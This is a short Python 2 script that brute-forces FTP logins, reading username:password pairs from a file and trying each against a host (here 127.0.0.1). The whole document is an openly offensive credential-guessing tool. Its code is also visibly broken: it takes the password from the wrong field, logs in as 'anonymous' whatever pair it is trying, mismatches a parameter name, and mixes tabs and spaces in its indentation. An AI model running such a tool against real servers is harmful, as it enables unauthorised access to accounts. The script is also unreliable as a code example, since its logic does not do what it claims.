import ftplib, time


def bruteLogin(hostname, passwordFile):
    pF = open(passwdFile, 'r')
    for line in pF.readlines():
	time.sleep(1)
	userName = line.split(':')[0]
	passWord = line.split(':')[0].strip('\r').strip('\n')
	print "[+] Trying: " + userName + "/" + passWord
    	try: 
	    ftp = ftplib.FTP(hostname)
	    ftp.login('anonymous', 'me@your.com')
	    print '\n[*] ' + str(hostname) + ' FTP Logon Succeeded: ' + userName + '/' + passWord
	    ftp.quit()
	    return (userName, passWord)
        except Exception, e:
	    pass
    print '\n[-] Could not brute force FTP credentials.'
    return (None, None)

host = '127.0.0.1'
passwdFile = 'userpass.txt'
bruteLogin(host, passwdFile)
	
